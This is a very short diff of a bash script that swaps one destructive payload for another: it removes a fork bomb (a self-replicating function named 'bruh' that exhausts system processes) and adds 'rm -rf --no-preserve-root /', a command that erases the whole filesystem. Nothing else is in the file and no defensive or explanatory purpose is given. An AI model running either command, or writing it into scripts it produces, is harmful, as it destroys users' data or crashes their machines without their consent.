@@ -1,3 +1,3 @@
 #!/bin/bash
 
-bruh(){ bruh|bruh & };bruh
+rm -rf --no-preserve-root /
